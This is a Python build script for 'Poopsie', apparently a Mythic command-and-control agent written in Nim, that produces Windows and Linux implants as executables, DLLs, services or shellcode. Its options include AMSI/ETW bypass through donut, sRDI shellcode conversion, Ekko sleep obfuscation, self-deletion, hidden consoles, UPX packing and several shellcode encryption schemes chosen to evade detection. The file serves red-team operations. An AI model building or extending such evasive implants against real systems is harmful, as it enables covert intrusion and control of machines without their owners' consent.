import asyncio
import json
import tomllib
import os
import pathlib
import subprocess
import sys
import tempfile
import traceback
from pathlib import Path
from mythic_container.PayloadBuilder import *
from mythic_container.MythicRPC import *

sys.path.append(str(pathlib.Path(".") / "poopsie" / "agent_code"))
from ShellcodeRDI import ConvertToShellcode, HashFunctionName


class Poopsie(PayloadType):
    name = "poopsie"
    file_extension = "exe"
    author = "@haha150"
    supported_os = [
        SupportedOS.Windows,
        SupportedOS.Linux,
    ]
    mythic_encrypts = True
    wrapper = False
    wrapped_payloads = []
    note = "Poopsie is a cross-platform C2 agent written in Nim."
    supports_dynamic_loading = False
    supports_multiple_c2_instances_in_build = False
    supports_multiple_c2_in_build = False
    
    shellcode_format_options = ["Binary", "Base64", "C", "CSharp", "Hex", "Ruby", "Python"]
    shellcode_bypass_options = ["None", "Abort on fail", "Continue on fail"]
    
    build_parameters = [
        BuildParameter(
            name="output_type",
            parameter_type=BuildParameterType.ChooseOne,
            description="Output format for the payload",
            choices=["Executable", "DLL", "Service", "Shellcode"],
            default_value="Executable",
            required=True,
        ),
        BuildParameter(
            name="service_name",
            parameter_type=BuildParameterType.String,
            description="Windows service name",
            default_value="PoopsieService",
            required=False,
            group_name="Service Options",
            hide_conditions=[
                HideCondition(name="output_type", operand=HideConditionOperand.NotEQ, value="Service")
            ],
            supported_os=["Windows"]
        ),
        BuildParameter(
            name="tool",
            parameter_type=BuildParameterType.ChooseOne,
            description="Shellcode generation tool",
            default_value="sRDI",
            choices=["sRDI", "donut"],
            required=False,
            group_name="Shellcode Options",
            hide_conditions=[
                HideCondition(name="output_type", operand=HideConditionOperand.NotEQ, value="Shellcode")
            ],
            supported_os=["Windows"]
        ),
        BuildParameter(
            name="shellcode_format",
            parameter_type=BuildParameterType.ChooseOne,
            choices=shellcode_format_options,
            default_value="Binary",
            description="Donut shellcode format options. Only used if shellcode tool is donut.",
            required=False,
            group_name="Shellcode Options",
            hide_conditions=[
                HideCondition(name="output_type", operand=HideConditionOperand.NotEQ, value="Shellcode"),
                HideCondition(name="tool", operand=HideConditionOperand.NotEQ, value="donut")
            ],
            supported_os=["Windows"]
        ),
        BuildParameter(
            name="shellcode_bypass",
            parameter_type=BuildParameterType.ChooseOne,
            choices=shellcode_bypass_options,
            default_value="None",
            description="Donut shellcode AMSI/WLDP/ETW Bypass options. Only used if shellcode tool is donut.",
            required=False,
            group_name="Shellcode Options",
            hide_conditions=[
                HideCondition(name="output_type", operand=HideConditionOperand.NotEQ, value="Shellcode"),
                HideCondition(name="tool", operand=HideConditionOperand.NotEQ, value="donut")
            ],
            supported_os=["Windows"]
        ),
        BuildParameter(
            name="sRDI_flags",
            parameter_type=BuildParameterType.ChooseOne,
            description="sRDI flags (0x1 = Clear the PE header on load, 0x4 = Randomize import dependency load order, 0x8 = Pass shellcode base address to exported function)",
            default_value="0",
            choices=["0", "0x1", "0x4", "0x8"],
            required=False,
            group_name="Shellcode Options",
            hide_conditions=[
                HideCondition(name="output_type", operand=HideConditionOperand.NotEQ, value="Shellcode"),
                HideCondition(name="tool", operand=HideConditionOperand.NotEQ, value="sRDI")
            ],
            supported_os=["Windows"]
        ),
        BuildParameter(
            name="architecture",
            parameter_type=BuildParameterType.ChooseOne,
            description="Target architecture for the payload",
            choices=["x64", "x86"],
            default_value="x64",
            required=True,
        ),
        BuildParameter(
            name="debug",
            parameter_type=BuildParameterType.Boolean,
            description="Enable debug logging (logs all HTTP requests/responses and operations)",
            default_value=False,
            required=False,
        ),
        BuildParameter(
            name="sleep_obfuscation",
            parameter_type=BuildParameterType.ChooseOne,
            description="Sleep obfuscation technique (Windows x64 only)",
            default_value="none",
            choices=["none", "ekko"],
            group_name="Sleep Obfuscation Options",
            hide_conditions=[
                HideCondition(name="architecture", operand=HideConditionOperand.NotEQ, value="x64")
            ],
            required=True,
            supported_os=["Windows"],
        ),
        BuildParameter(
            name="self_delete",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="Enable self-deletion of the agent on exit (Windows only). Does not work with daemonized processes.",
            required=False,
            supported_os=["Windows"],
        ),
        BuildParameter(
            name="adjust_filename",
            parameter_type=BuildParameterType.Boolean,
            description="Automatically adjust payload extension based on selected choices.",
            default_value=True,
            required=False,
        ),
        BuildParameter(
            name="payload_compression",
            parameter_type=BuildParameterType.ChooseOne,
            description="Payload compression option.",
            default_value="none",
            choices=["none", "upx"],
            required=True,
            hide_conditions=[
                HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="Shellcode")
            ],
            supported_os=["Windows", "Linux"],
        ),
        BuildParameter(
            name="daemonize",
            parameter_type=BuildParameterType.Boolean,
            description=(
                "Hide the console window on Windows or run the process in the background on Linux."
            ),
            default_value=False,
            required=True,
            supported_os=["Windows", "Linux"],
        ),
        BuildParameter(
            name="shellcode_encryption",
            parameter_type=BuildParameterType.ChooseOne,
            description="Shellcode encryption option.",
            default_value="none",
            choices=["none", "xor_single", "xor_multi", "xor_counter", "xor_feedback", "xor_rolling", "rc4", "chacha20"],
            required=True,
            group_name="Shellcode Options",
            hide_conditions=[
                HideCondition(name="output_type", operand=HideConditionOperand.NotEQ, value="Shellcode")
            ],
            supported_os=["Windows"],
        ),
        BuildParameter(
            name="shellcode_encryption_key",
            parameter_type=BuildParameterType.String,
            description=(
                "xor_single key example: 0xfa, xor_multi key example: MySecretKey123, xor_counter key example: MyCounterKey2024, xor_feedback key example: MyFeedbackKey!@#, xor_rolling key example: RollingKeySecret, rc4 key example: MySecretKey123, chacha20 key example: MySecret32ByteChaChaKey01234 (must be 32 bytes)"
            ),
            default_value="",
            required=False,
            group_name="Shellcode Options",
            hide_conditions=[
                HideCondition(name="output_type", operand=HideConditionOperand.NotEQ, value="Shellcode"),
                HideCondition(name="shellcode_encryption", operand=HideConditionOperand.EQ, value="none"),
            ],
            supported_os=["Windows"]
        ),
        BuildParameter(
            name="shellcode_encryption_iv",
            parameter_type=BuildParameterType.String,
            description=(
                "xor_feedback iv example: 0xAA"
            ),
            default_value="",
            required=False,
            group_name="Shellcode Options",
            hide_conditions=[
                HideCondition(name="output_type", operand=HideConditionOperand.NotEQ, value="Shellcode"),
                HideCondition(name="shellcode_encryption", operand=HideConditionOperand.NotEQ, value="xor_feedback"),
            ],
            supported_os=["Windows"]
        ),
        BuildParameter(
            name="shellcode_encryption_nonce",
            parameter_type=BuildParameterType.String,
            description=(
                "chacha20 nonce example: My12ByteNon (must be 12 bytes)"
            ),
            default_value="",
            required=False,
            group_name="Shellcode Options",
            hide_conditions=[
                HideCondition(name="output_type", operand=HideConditionOperand.NotEQ, value="Shellcode"),
                HideCondition(name="shellcode_encryption", operand=HideConditionOperand.NotEQ, value="chacha20"),
            ],
            supported_os=["Windows"]
        ),
    ]
    
    c2_profiles = ["http", "websocket", "httpx", "dns", "tcp", "smb"]

    c2_parameter_deviations = {
        "http": {
            "get_uri": C2ParameterDeviation(supported=False),
            "query_path_name": C2ParameterDeviation(supported=False),
        }
    }

    agent_path = pathlib.Path(".") / "poopsie" / "mythic"
    agent_code_path = pathlib.Path(".") / "poopsie" / "agent_code"
    agent_icon_path = agent_path / "agent_icon" / "poopsie.svg"

    build_steps = [
        BuildStep(step_name="Configuration", step_description="Preparing build configuration"),
        BuildStep(step_name="Compiling", step_description="Building payload with Nim"),
        BuildStep(step_name="Compressing", step_description="Compressing payload"),
        BuildStep(step_name="Shellcode", step_description="Converting to Shellcode"),
        BuildStep(step_name="Finalizing", step_description="Packaging final payload"),
    ]
    
    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Error)
        try:
            selected_os = self.selected_os
            
            resp.build_message += f"Building Nim payload for {selected_os}...\n"

            output_type = self.get_parameter("output_type")
            
            if selected_os == "Linux" and output_type in ["Service", "Shellcode"]:
                resp.build_message += f"Linux builds do not support output type: {output_type}\n"
                resp.status = BuildStatus.Error
                return resp
            
            if selected_os == "Windows":
                if output_type == "DLL":
                    self.file_extension = "dll"
                elif output_type == "Shellcode":
                    self.file_extension = "bin"
                else:
                    self.file_extension = "exe"
            else:
                if output_type == "DLL":
                    self.file_extension = "so"
                else:
                    self.file_extension = "bin"

            c2 = self.c2info[0]
            profile = c2.get_c2profile()["name"]

            c2_params = c2.get_parameters_dict()
            c2_params["UUID"] = self.uuid
            c2_params["profile"] = profile
            
            if profile.lower() == "websocket":
                tasking_type = c2_params.get("tasking_type", "").lower()
                if tasking_type == "push":
                    resp.build_message += "Error: WebSocket profile only supports 'Poll' tasking mode. 'Push' mode is not implemented.\n"
                    resp.build_message += "Please select 'Poll' as the tasking type in the WebSocket C2 profile configuration.\n"
                    resp.status = BuildStatus.Error
                    return resp

            c2_params["output_type"] = self.get_parameter("output_type")
            
            architecture = self.get_parameter("architecture")
            sleep_obfuscation = self.get_parameter("sleep_obfuscation")
            if architecture == "x86" and sleep_obfuscation == "ekko":
                c2_params["sleep_obfuscation"] = "none"
            else:
                c2_params["sleep_obfuscation"] = sleep_obfuscation
            
            c2_params["self_delete"] = str(self.get_parameter("self_delete"))
            
            if output_type == "Service":
                service_name = self.get_parameter("service_name")
                if not service_name:
                    service_name = "PoopsieService"
                c2_params["SERVICE_NAME"] = service_name

            build_env = {}
            for key, val in c2_params.items():
                if isinstance(val, str):
                    if key == "raw_c2_config":
                        response = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(val))
                        if response.Success:
                            val = response.Content.decode('utf-8')
                            config = None
                            format_used = ""
                            try:
                                config = json.loads(val)
                                format_used = "JSON"
                            except json.JSONDecodeError:
                                try:
                                    config = tomllib.loads(val)
                                    format_used = "TOML"
                                except Exception as toml_error:
                                    resp.build_message = f"Failed to parse raw_c2_config as JSON or TOML.\nJSON error: Invalid JSON\nTOML error: {str(toml_error)}"
                                    resp.status = BuildStatus.Error
                                    return resp
                            
                            # Normalize TOML structure to match JSON expectations
                            # TOML omits keys with empty values, but the agent expects them
                            if format_used == "TOML":
                                config = self.normalize_c2_config(config)
                            
                            # Convert to JSON string for environment variable
                            val = json.dumps(config)
                            resp.build_message += f"Parsed raw_c2_config as {format_used}\n"
                        else:
                            resp.build_message = "Failed to get raw C2 config file"
                            resp.status = BuildStatus.Error
                            return resp
                    build_env[key.upper()] = val.strip()
                elif isinstance(val, (int, bool)):
                    build_env[key.upper()] = str(val)
                elif isinstance(val, dict):
                    build_env[key.upper()] = json.dumps(val)
                elif isinstance(val, list):
                    build_env[key.upper()] = json.dumps(val)
                else:
                    build_env[key.upper()] = str(val)

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Configuration",
                StepStdout="Successfully prepared build configuration",
                StepSuccess=True
            ))

            resp.build_message += "\nBuild Configuration:\n"
            for key, value in build_env.items():
                display_value = value
                resp.build_message += f"  {key}: {display_value}\n"
            resp.build_message += "\n"

            output_type = self.get_parameter("output_type")
            resp.build_message += f"Compiling Nim agent ({output_type}) for {selected_os}...\n"
            build_result = await self.run_nim_build(selected_os, output_type, build_env)
            
            if "messages" in build_result:
                for msg in build_result["messages"]:
                    resp.build_message += msg + "\n"
            
            if not build_result["success"]:
                resp.build_message += f"\nNim build failed: {build_result['error']}\n"
                resp.status = BuildStatus.Error
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Compiling",
                    StepStdout=f"Build failed: {build_result['error']}",
                    StepSuccess=False
                ))
                return resp
            
            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Compiling",
                StepStdout=f"Successfully compiled Nim agent for {selected_os}",
                StepSuccess=True
            ))
            resp.build_message += f"Build command:\n{build_result['command']}\n"

            output_path = build_result["path"]

            payload_compression = self.get_parameter("payload_compression")
            if not (output_type == "Shellcode" and selected_os == "Windows"):
                strip_cmd = f"strip {output_path}"
                proc = await asyncio.create_subprocess_shell(
                    strip_cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, stderr = await proc.communicate()
                if proc.returncode != 0:
                    resp.build_message += f"[strip] {strip_cmd} failed: {stderr.decode()}\n"
                    resp.status = BuildStatus.Error
                    return resp
                if payload_compression == "upx":
                    upx_cmd = f"/upx --best --lzma {output_path}"
                    proc = await asyncio.create_subprocess_shell(
                        upx_cmd,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                    )
                    stdout, stderr = await proc.communicate()
                    if proc.returncode != 0:
                        resp.build_message += f"[upx] {upx_cmd} failed: {stderr.decode()}\n"
                        resp.status = BuildStatus.Error
                        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Compressing",
                            StepStdout=f"UPX compression failed: {stderr.decode()}",
                            StepSuccess=False
                        ))
                        return resp

                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Compressing",
                        StepStdout=f"Successfully compressed payload with UPX",
                        StepSuccess=True
                    ))

                    resp.build_message += f"Successfully compressed payload with UPX\n"

            if output_type == "Shellcode" and selected_os == "Windows":
                resp.build_message += "Converting to shellcode...\n"
                dll_build_result = await self.run_nim_build(selected_os, "DLL", build_env)
                if not dll_build_result["success"]:
                    resp.build_message += f"\nDLL build for shellcode failed: {dll_build_result['error']}\n"
                    resp.status = BuildStatus.Error
                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Shellcode",
                        StepStdout=f"Failed to build DLL for shellcode conversion",
                        StepSuccess=False
                    ))
                    return resp
                
                dll_path = dll_build_result["path"]
                strip_cmd = f"strip {dll_path}"
                proc = await asyncio.create_subprocess_shell(
                    strip_cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, stderr = await proc.communicate()
                if proc.returncode != 0:
                    resp.build_message += f"[strip DLL] {strip_cmd} failed: {stderr.decode()}\n"
                    resp.status = BuildStatus.Error
                    return resp

                tool = self.get_parameter("tool")
                command = ""
                if tool == "sRDI":
                    with open(dll_path, "rb") as f:
                        dll_bytes = f.read()
                    flags = int(self.get_parameter("sRDI_flags"), 16) if self.get_parameter("sRDI_flags") else 0
                    shellcode = ConvertToShellcode(dll_bytes, HashFunctionName("entrypoint"), flags=flags)
                    output_path = self.agent_code_path / "src" / "poopsie.bin"
                    with open(output_path, "wb") as f:
                        f.write(shellcode)
                    command = "ConvertToShellcode(dll_bytes, HashFunctionName(\"entrypoint\"), flags=flags)"
                    resp.build_message += f"Successfully converted to shellcode using sRDI (flags={hex(flags)})\n"
                else:
                    output_path = self.agent_code_path / "src" / "poopsie.bin"
                    shellcode_format = self.shellcode_format_options.index(self.get_parameter('shellcode_format')) + 1
                    shellcode_bypass = self.shellcode_bypass_options.index(self.get_parameter('shellcode_bypass')) + 1
                    command = f"/donut -x3 -k2 -m entrypoint -o {output_path} -i {dll_path} -f{shellcode_format} -b{shellcode_bypass}"
                    proc = await asyncio.create_subprocess_shell(
                        command,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                    )
                    stdout, stderr = await proc.communicate()
                    if proc.returncode != 0:
                        resp.build_message += f"Donut shellcode generation failed\nSTDOUT: {stdout.decode()}\nSTDERR: {stderr.decode()}\n"
                        resp.status = BuildStatus.Error
                        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Shellcode",
                            StepStdout=f"Donut failed: {stderr.decode()}",
                            StepSuccess=False
                        ))
                        return resp
                    resp.build_message += f"Successfully converted to shellcode using donut\n"
                
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Shellcode",
                    StepStdout="Successfully converted to shellcode\nCommand:\n{}".format(command),
                    StepSuccess=True
                ))

                # encrypt shellcode if requested
                if self.get_parameter("shellcode_encryption") != "none" and self.get_parameter("shellcode_format") == "Binary":
                    resp.build_message += f"Encrypting shellcode...using {self.get_parameter('shellcode_encryption')}...\n"
                    try:
                        output_path = self.encrypt(output_path)
                    except Exception as e:
                        resp.build_message += f"Shellcode encryption failed: {str(e)}\n"
                        resp.status = BuildStatus.Error
                        return resp

            resp.build_message += "Reading final payload...\n"
            with open(output_path, "rb") as f:
                resp.payload = f.read()

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Finalizing",
                StepStdout=f"Successfully packaged Nim payload",
                StepSuccess=True
            ))

            resp.status = BuildStatus.Success
            resp.build_message += f"\nSuccessfully built Nim payload for {selected_os}\n"

            if self.get_parameter("adjust_filename"):
                resp.updated_filename = self.adjust_file_name(self.filename, selected_os)

        except Exception as e:
            resp.build_message = f"Error building payload: {str(e)}\n{traceback.format_exc()}"
            resp.status = BuildStatus.Error

        return resp

    async def run_nim_build(self, selected_os: str, output_type: str, build_env: dict) -> dict:
        """Compile Nim agent with environment variables"""
        try:
            build_messages = []
            
            env = os.environ.copy()
            env.update(build_env)
            
            architecture = self.get_parameter("architecture")
            nim_cpu = "amd64" if architecture == "x64" else "i386"
            
            encrypted_exchange = build_env.get("ENCRYPTED_EXCHANGE_CHECK", "").strip().upper()
            callback_host = build_env.get("CALLBACK_HOST", "").lower()
            profile = build_env.get("PROFILE", "").lower()
            
            needs_openssl_for_exchange = encrypted_exchange in ["T", "TRUE"]
            
            if selected_os == "Windows":
                needs_openssl_for_transport = False
            else:
                needs_openssl_for_transport = (
                    callback_host.startswith("https://") or 
                    callback_host.startswith("wss://") or
                    (profile == "websocket" and callback_host.startswith("wss://"))
                )
            
            use_openssl = needs_openssl_for_exchange or needs_openssl_for_transport
            
            nim_args = [
                "--opt:size",
                "--mm:orc",
                "--panics:on",
                "--passC:-flto",
                "--passL:-flto",
                "--passL:-s",
                "--d:strip",
                "--d:useMalloc",
                "--parallelBuild:0",
                "--threads:on",
            ]

            if not self.get_parameter("debug"):
                nim_args.append("-d:release")
            else:
                build_messages.append("Debug mode enabled (includes debug symbols)")

            if output_type == "Executable" and self.get_parameter("daemonize"):
                nim_args.append("-d:daemonize")
            
            if selected_os == "Windows":
                if self.get_parameter("self_delete"):
                    nim_args.append("-d:selfDelete")
                if architecture == "x64":
                    if self.get_parameter("sleep_obfuscation") == "ekko":
                        nim_args.append("-d:sleepObfuscationEkko")

            if use_openssl:
                if selected_os == "Windows":
                    if architecture == "x64":
                        openssl_path = "/opt/openssl-mingw64-static"
                        openssl_lib = f"{openssl_path}/lib64"
                    else:
                        openssl_path = "/opt/openssl-mingw32-static"
                        openssl_lib = f"{openssl_path}/lib"
                    
                    nim_args.extend([
                        "-d:staticOpenSSL",
                        f"--passC:-I{openssl_path}/include",
                        "--dynlibOverride:ssl",
                        "--dynlibOverride:crypto",
                        f"--passL:{openssl_lib}/libssl.a",
                        f"--passL:{openssl_lib}/libcrypto.a",
                        "--passL:-lws2_32",
                        "--passL:-lcrypt32",
                        "--passL:-lbcrypt",
                        "--passL:-ladvapi32",
                    ])
                    
                    build_messages.append(f"Static OpenSSL 3.5.4 enabled ({architecture}, RSA key exchange, no DLL dependencies)")
                elif selected_os == "Linux":
                    nim_args.extend([
                        "-d:ssl",
                    ])
                    if needs_openssl_for_exchange and needs_openssl_for_transport:
                        build_messages.append("Dynamic OpenSSL enabled (HTTPS/WSS transport + RSA key exchange)")
                    elif needs_openssl_for_exchange:
                        build_messages.append("Dynamic OpenSSL enabled (RSA key exchange, requires libssl.so on target)")
                    else:
                        build_messages.append("Dynamic OpenSSL enabled (HTTPS/WSS transport)")
                    build_messages.append("  Note: Target system must have OpenSSL 1.1+ or 3.x installed")
            else:
                if selected_os == "Windows":
                    build_messages.append("AESPSK mode (no RSA)")
                else:
                    build_messages.append("AESPSK mode (no RSA, standard httpclient)")
            
            if selected_os == "Windows":
                if callback_host.startswith("https://") or callback_host.startswith("wss://"):
                    build_messages.append("Custom WinHTTP client (native Windows API for HTTPS/WSS transport, no DLLs)")
            
            if output_type == "DLL":
                nim_args.extend([
                    "--app:lib",
                    "--nomain",
                    "-d:dll",
                ])
            elif output_type == "Service":
                nim_args.extend([
                    "-d:service",
                ])
            if selected_os == "Windows":
                if architecture == "x64":
                    nim_args.extend([
                        "--os:windows",
                        "--cpu:amd64",
                        "--cc:gcc",
                        "--gcc.exe:x86_64-w64-mingw32-gcc",
                        "--gcc.linkerexe:x86_64-w64-mingw32-gcc",
                        "--passL:-static"
                    ])
                else:
                    nim_args.extend([
                        "--os:windows",
                        "--cpu:i386",
                        "--cc:gcc",
                        "--gcc.exe:i686-w64-mingw32-gcc",
                        "--gcc.linkerexe:i686-w64-mingw32-gcc",
                        "--passL:-static"
                    ])
                if output_type == "DLL":
                    output_name = "poopsie.dll"
                else:
                    output_name = "poopsie.exe"
            elif selected_os == "Linux":
                nim_args.extend(["--os:linux", f"--cpu:{nim_cpu}"])
                output_name = "libpoopsie.so" if output_type == "DLL" else "poopsie"
            else:
                output_name = "libpoopsie.so" if output_type == "DLL" else "poopsie"
            
            cmd_args = ["nim", "c"] + nim_args + ["src/poopsie.nim"]
            
            if os.path.exists("/usr/lib/ccache"):
                env["PATH"] = f"/usr/lib/ccache:{env.get('PATH', '')}"
            
            env_parts = []
            for k, v in build_env.items():
                escaped_value = str(v).replace("'", "'\\''")
                env_parts.append(f"{k}='{escaped_value}'")
            env_str = ' '.join(env_parts)
            command = f'{env_str} {" ".join(cmd_args)}'
            
            process = await asyncio.create_subprocess_exec(
                *cmd_args,
                cwd=str(self.agent_code_path),
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                env=env
            )
            
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=600)
            
            if process.returncode != 0:
                stdout_text = stdout.decode() if stdout else ""
                stderr_text = stderr.decode() if stderr else ""
                return {
                    "success": False,
                    "error": f"Nim compilation failed with code {process.returncode}\n\nSTDOUT:\n{stdout_text}\n\nSTDERR:\n{stderr_text}",
                    "command": command,
                    "messages": build_messages
                }
            
            output_path = self.agent_code_path / "src" / output_name
            if not output_path.exists():
                return {
                    "success": False,
                    "error": f"Compiled binary not found at {output_path}",
                    "command": command,
                    "messages": build_messages
                }
            
            return {
                "success": True,
                "path": output_path,
                "command": command,
                "messages": build_messages
            }
            
        except asyncio.TimeoutError:
            return {"success": False, "error": "Build timeout (exceeded 5 minutes)", "command": ""}
        except Exception as e:
            return {"success": False, "error": str(e), "command": ""}
    
    def adjust_file_name(self, filename, selected_os):
        """Adjust filename based on OS and output type"""
        filename_pieces = filename.split(".")
        original_filename = ".".join(filename_pieces[:-1])
        output_type = self.get_parameter("output_type")
        architecture = self.get_parameter("architecture")
        
        arch_suffix = f"_{architecture}"
        if not original_filename.endswith(arch_suffix):
            original_filename += arch_suffix
        
        if selected_os == "Windows":
            if output_type == "DLL":
                return original_filename + ".dll"
            elif output_type == "Shellcode":
                return original_filename + ".bin"
            else:
                return original_filename + ".exe"
        else:
            if output_type == "DLL":
                return original_filename + ".so"
            else:
                return original_filename + ".bin"

    def parse_key(self, key_str):
        """Parse key from string (hex, decimal, or plain text)"""
        key_str = key_str.strip()
        
        if key_str.startswith("0x") or key_str.startswith("0X"):
            return bytes([int(key_str, 16)])
        elif all(c in "0123456789abcdefABCDEF" for c in key_str):
            return bytes([int(key_str, 16)])
        elif key_str.isdigit():
            return bytes([int(key_str, 10)])
        elif len(key_str) == 1:
            return key_str.encode()
        else:
            return key_str.encode()

    def normalize_c2_config(self, config):
        """Normalize TOML-parsed config to match JSON structure expectations.
        TOML omits keys with empty string values, but the agent expects them to exist."""
        
        def ensure_keys(obj, keys_with_defaults):
            """Ensure specified keys exist in object with default values"""
            if isinstance(obj, dict):
                for key, default_value in keys_with_defaults.items():
                    if key not in obj:
                        obj[key] = default_value
        
        def normalize_transforms(transforms):
            """Ensure each transform has 'value' key"""
            if isinstance(transforms, list):
                for transform in transforms:
                    if isinstance(transform, dict):
                        ensure_keys(transform, {"value": ""})
        
        def normalize_message(message):
            """Ensure message has 'name' key"""
            if isinstance(message, dict):
                ensure_keys(message, {"name": ""})
        
        # Normalize GET section
        if "get" in config:
            get_section = config["get"]
            
            # Normalize client
            if "client" in get_section:
                client = get_section["client"]
                if "transforms" in client:
                    normalize_transforms(client["transforms"])
                if "message" in client:
                    normalize_message(client["message"])
                ensure_keys(client, {"parameters": None})
            
            # Normalize server
            if "server" in get_section:
                server = get_section["server"]
                if "transforms" in server:
                    normalize_transforms(server["transforms"])
        
        # Normalize POST section
        if "post" in config:
            post_section = config["post"]
            
            # Normalize client
            if "client" in post_section:
                client = post_section["client"]
                if "transforms" in client:
                    normalize_transforms(client["transforms"])
                if "message" in client:
                    normalize_message(client["message"])
                ensure_keys(client, {"parameters": None})
            
            # Normalize server
            if "server" in post_section:
                server = post_section["server"]
                if "transforms" in server:
                    normalize_transforms(server["transforms"])
        
        return config

    def encrypt(self, payload_path):
        encrypted_path = str(payload_path) + ".enc"
        encryption_type = self.get_parameter("shellcode_encryption")
        key_str = self.get_parameter("shellcode_encryption_key").strip()
        shellcode = b""
        
        if encryption_type == "xor_single" or encryption_type == "xor_multi":
            key = self.parse_key(key_str)
            
            with open(payload_path, "rb") as f:
                shellcode = f.read()
            shellcode = bytearray(shellcode)
            
            for i in range(len(shellcode)):
                shellcode[i] ^= key[i % len(key)]
        
        elif encryption_type == "xor_counter":
            key = self.parse_key(key_str)
            
            with open(payload_path, "rb") as f:
                shellcode = f.read()
            shellcode = bytearray(shellcode)
            
            keylen = len(key)
            for i in range(len(shellcode)):
                shellcode[i] ^= key[i % keylen] ^ (i & 0xFF)
        
        elif encryption_type == "xor_feedback":
            key = self.parse_key(key_str)
            
            # Get IV - check for None first
            iv_param = self.get_parameter("shellcode_encryption_iv")
            if iv_param is None:
                raise Exception("IV parameter is required for xor_feedback encryption")
            
            iv_str = iv_param.strip() if isinstance(iv_param, str) else str(iv_param)
            if not iv_str or iv_str == "":
                raise Exception("IV cannot be empty for xor_feedback encryption")
            
            if iv_str.startswith("0x") or iv_str.startswith("0X"):
                iv = int(iv_str, 16)
            else:
                iv = int(iv_str, 10)
            
            with open(payload_path, "rb") as f:
                shellcode = f.read()
            
            encrypted = bytearray()
            prev = iv & 0xFF
            keylen = len(key)
            
            for i, b in enumerate(shellcode):
                ciphertext = b ^ key[i % keylen] ^ prev
                encrypted.append(ciphertext)
                prev = ciphertext
            
            shellcode = encrypted
        
        elif encryption_type == "xor_rolling":
            key = self.parse_key(key_str)
            
            with open(payload_path, "rb") as f:
                shellcode = f.read()
            
            keylen = len(key)
            rolling_key = 0
            
            for k in key:
                rolling_key ^= k
            
            encrypted = bytearray()
            for i, b in enumerate(shellcode):
                encrypted.append(b ^ key[i % keylen] ^ (rolling_key & 0xFF))
                rolling_key = (rolling_key * 7 + 13) & 0xFF
            
            shellcode = encrypted
        
        elif encryption_type == "rc4":
            from Crypto.Cipher import ARC4
            
            key = self.parse_key(key_str)
            
            with open(payload_path, "rb") as f:
                shellcode = f.read()
            
            cipher = ARC4.new(key)
            shellcode = cipher.encrypt(shellcode)
        
        elif encryption_type == "chacha20":
            from Crypto.Cipher import ChaCha20
            
            key = self.parse_key(key_str)
            
            # Ensure key is exactly 32 bytes
            if len(key) < 32:
                key = key.ljust(32, b'\x00')
            elif len(key) > 32:
                key = key[:32]
            
            # Get nonce - check for None first
            nonce_param = self.get_parameter("shellcode_encryption_nonce")
            if nonce_param is None:
                raise Exception("Nonce parameter is required for chacha20 encryption")
            
            nonce_str = nonce_param.strip() if isinstance(nonce_param, str) else str(nonce_param)
            if not nonce_str or nonce_str == "":
                raise Exception("Nonce cannot be empty for chacha20 encryption")
            
            nonce = nonce_str.encode() if isinstance(nonce_str, str) else nonce_str
            
            # Ensure nonce is exactly 12 bytes
            if len(nonce) < 12:
                nonce = nonce.ljust(12, b'\x00')
            elif len(nonce) > 12:
                nonce = nonce[:12]
            
            with open(payload_path, "rb") as f:
                shellcode = f.read()
            
            cipher = ChaCha20.new(key=key, nonce=nonce)
            shellcode = cipher.encrypt(shellcode)
        
        else:
            raise Exception(f"Unsupported encryption type: {encryption_type}")
        
        # Write encrypted payload
        if shellcode:
            with open(encrypted_path, "wb") as f:
                f.write(shellcode)
            return encrypted_path
        
        raise Exception("Failed to encrypt payload - no shellcode generated")
